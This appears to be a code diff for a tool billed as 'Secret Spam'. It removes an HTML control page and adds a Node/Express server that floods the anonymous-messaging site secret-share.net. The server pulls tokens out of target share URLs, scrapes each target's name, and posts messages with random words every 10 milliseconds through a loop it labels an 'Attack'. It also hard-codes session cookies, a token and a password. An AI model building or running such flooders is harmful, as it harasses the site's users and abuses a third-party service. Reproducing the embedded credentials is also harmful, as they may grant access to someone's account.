@@ -1,201 +1,128 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secret Spam</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    .container {
-      background-color: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      width: 90%;
-      max-width: 500px;
-    }
-    input, button, textarea {
-      margin: 10px 0;
-      padding: 10px;
-      width: 100%;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
-    }
-    button {
-      background-color: #007BFF;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    p {
-      margin: 10px 0;
-    }
-    .contact {
-      margin-top: 20px;
-      font-size: 0.9em;
-      color: #555;
-    }
-    .button-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-  </style>
-  <script>
-    let loopId = Math.floor(Math.random() * 1000000) + 1;
-    let server = 'https://suss-j3kv.onrender.com';
+const express = require('express');
+const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
+const cors = require('cors');
+const os = require('os');
+const { JSDOM } = require('jsdom');
 
-    function extractTokens(urls) {
-      return urls.split(',').map(url => {
-        url = url.trim();
-        if (url.includes('play/message.php?u=')) {
-          const urlObj = new URL(url);
-          const params = new URLSearchParams(urlObj.search);
-          return params.get('u');
-        } else if (url.includes('i.secret-share.net/')) {
-          const tokenStart = url.indexOf('i.secret-share.net/') + 19;
-          const tokenEnd = url.indexOf('&n=');
-          return url.substring(tokenStart, tokenEnd);
-        } else {
-          return null;
+const app = express();
+const port = process.env.PORT || 3000;
+
+let loops = {};
+
+app.use(cors());
+app.use(express.json());
+
+app.use((req, res, next) => {
+  res.on('finish', () => {
+    const interfaces = os.networkInterfaces();
+    for (const iface of Object.values(interfaces)) {
+      for (const ifaceDetails of iface) {
+        if (ifaceDetails.family === 'IPv4' && !ifaceDetails.internal) {
+          console.log(`Server IP: ${ifaceDetails.address}`);
         }
-      }).filter(token => token !== null);
-    }
-
-    function replaceRandomWords(message, randomWords) {
-      let newMessage = message;
-      while (newMessage.includes('{rand}') && randomWords.length > 0) {
-        const randomWord = randomWords[Math.floor(Math.random() * randomWords.length)];
-        newMessage = newMessage.replace('{rand}', randomWord);
-      }
-      return newMessage;
-    }
-
-    function startLoop() {
-      const originalMessage = document.getElementById('message').value;
-      const urls = document.getElementById('url').value;
-      const randomWords = document.getElementById('random-words').value.split(',').map(word => word.trim());
-      const tokens = extractTokens(urls);
-      const isSingleMessage = document.getElementById('single-message-button').dataset.singleMessage === 'true';
-
-      if (tokens.length === 0) {
-        alert('Invalid URL format');
-        return;
-      }
-
-      document.getElementById('loop-status').textContent = isSingleMessage ? 'Sending message...' : 'Attack running...';
-
-      fetch(server +'/start', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ message: originalMessage, urls, tokens, loopId, isSingleMessage, randomWords })
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log(data);
-        document.getElementById('loop-status').textContent = isSingleMessage ? 'Message sent successfully!' : 'Attack started successfully!';
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        document.getElementById('loop-status').textContent = 'Error starting Attack.';
-      });
-    }
-
-    function stopLoops() {
-      document.getElementById('loop-status').textContent = 'Stopping Attack...';
-
-      fetch(server +'/stop', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ loopId })
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log(data);
-        document.getElementById('loop-status').textContent = 'Attack stopped successfully!';
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        document.getElementById('loop-status').textContent = 'Error stopping Attack.';
-      });
-    }
-
-    function checkServerStatus() {
-      fetch(server +'/status')
-        .then(response => {
-          if (response.ok) {
-            document.getElementById('server-status').textContent = 'Servers are up ^^';
-          } else {
-            document.getElementById('server-status').textContent = 'Servers are currently down :(';
-          }
-        })
-        .catch(error => {
-          document.getElementById('server-status').textContent = 'Servers are currently down :(';
-        });
-    }
-
-    function toggleSingleMessage() {
-      const button = document.getElementById('single-message-button');
-      const isSingleMessage = button.dataset.singleMessage === 'true';
-      button.dataset.singleMessage = isSingleMessage ? 'false' : 'true';
-      button.textContent = isSingleMessage ? 'Enable Single Message Mode' : 'Disable Single Message Mode';
-
-      const startButton = document.getElementById('start-button');
-      const stopButton = document.getElementById('stop-button');
-
-      if (isSingleMessage) {
-        startButton.style.display = 'block';
-        stopButton.style.display = 'block';
-        startButton.textContent = 'Start Loop';
-      } else {
-        startButton.style.display = 'block';
-        stopButton.style.display = 'none';
-        startButton.textContent = 'Send message';
       }
     }
+  });
+  next();
+});
 
-    document.addEventListener('DOMContentLoaded', (event) => {
-      document.getElementById('loopId').textContent = loopId;
-      document.getElementById('loop-status').textContent = 'The only, and therefore the best, secret spammer. Made by a person on FC';
-      document.getElementById('single-message-button').addEventListener('click', toggleSingleMessage);
-      checkServerStatus();
+const postData = (message, name, token) => {
+  fetch('https://secret-share.net/play/action.php', {
+    method: 'POST',
+    headers: {
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
+      'cache-control': 'no-cache',
+      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+      'cookie': 'secret_id=13127; secret_token=xB0rCCuz6h3ogNubCi5fF5LBH; secret_password=y7VwFlzErAWOz98K0Kow2ItbG; secret_user_agent=Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; PHPSESSID=ouvrk1221sbnq7edm99hjg0166',
+      'origin': 'https://secret-share.net',
+      'pragma': 'no-cache',
+      'priority': 'u=1, i',
+      'referer': 'https://secret-share.net/play/message.php?u=xB0rCCuz6h3ogNubCi5fF5LBH&n=13127',
+      'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Windows"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'same-origin',
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+      'x-requested-with': 'XMLHttpRequest'
+    },
+    body: new URLSearchParams({
+      'message': message,
+      'name': name,
+      'token': token
+    })
+  })
+  .then(response => response.text())
+  .then(data => console.log(data))
+  .catch(error => console.error('Error:', error));
+};
+
+const stopLoopAfterTime = (loopId, time) => {
+  setTimeout(() => {
+    if (loops[loopId]) {
+      clearInterval(loops[loopId]);
+      delete loops[loopId];
+      console.log(`Loop ${loopId} automatically stopped after ${time / 1000} seconds`);
+    }
+  }, time);
+};
+
+const replaceRandomWords = (message, randomWords) => {
+  let newMessage = message;
+  while (newMessage.includes('{rand}') && randomWords.length > 0) {
+    const randomWord = randomWords[Math.floor(Math.random() * randomWords.length)];
+    newMessage = newMessage.replace('{rand}', randomWord);
+  }
+  return newMessage;
+};
+
+app.post('/start', async (req, res) => {
+  const { message, urls, tokens, loopId, isSingleMessage, randomWords } = req.body;
+
+  try {
+    const namePromises = urls.split(',').map(async url => {
+      const response = await fetch(url.trim());
+      const text = await response.text();
+      const dom = new JSDOM(text);
+      return dom.window.document.querySelector("#generate_form_box > div.secret_form > div > h1").textContent;
     });
-  </script>
-</head>
-<body>
-  <div class="container">
-    <h1>Secret Spam by a person on FC</h1>
-    <p>Loop ID: <span id="loopId"></span></p>
-    <input type="text" id="message" placeholder="Your message {rand} for random phrases">
-    <textarea id="url" placeholder="SS URLs (separated by commas)"></textarea>
-    <input type="text" id="random-words" placeholder="Random phrases (separated by commas)">
-    <div class="button-container">
-      <button id="single-message-button" data-single-message="false">Enable Single Message Mode</button>
-      <button id="start-button" onclick="startLoop()">Start Loop</button>
-      <button id="stop-button" onclick="stopLoops()">Stop Loops</button>
-    </div>
-    <p id="loop-status">Idle...</p>
-    <p id="server-status"></p>
-    <p class="contact">Contact me at: <a href="https://discord.gg/KUw3dYG2AR">https://discord.gg/KUw3dYG2AR</a></p>
-  </div>
-</body>
-</html>
+
+    const names = await Promise.all(namePromises);
+
+    if (isSingleMessage) {
+      tokens.forEach((token, index) => postData(replaceRandomWords(message, randomWords), names[index], token));
+      res.send(`Single message sent successfully`);
+    } else {
+      if (!loops[loopId]) {
+        loops[loopId] = setInterval(() => {
+          tokens.forEach((token, index) => postData(replaceRandomWords(message, randomWords), names[index], token));
+        }, 10);
+        stopLoopAfterTime(loopId, 10000000);
+        res.send(`Loop ${loopId} started and will stop after 100 seconds`);
+      } else {
+        res.send(`Loop ${loopId} is already running`);
+      }
+    }
+  } catch (error) {
+    console.error('Error:', error);
+    res.status(500).send('Failed to fetch the name from the URL');
+  }
+});
+
+app.post('/stop', (req, res) => {
+  const { loopId } = req.body;
+
+  if (loops[loopId]) {
+    clearInterval(loops[loopId]);
+    delete loops[loopId];
+    res.send(`Loop ${loopId} stopped`);
+  } else {
+    res.send(`Loop ${loopId} is not running`);
+  }
+});
+
+app.listen(port, () => {
+  console.log(`Server is running at http://localhost:${port}`);
+});
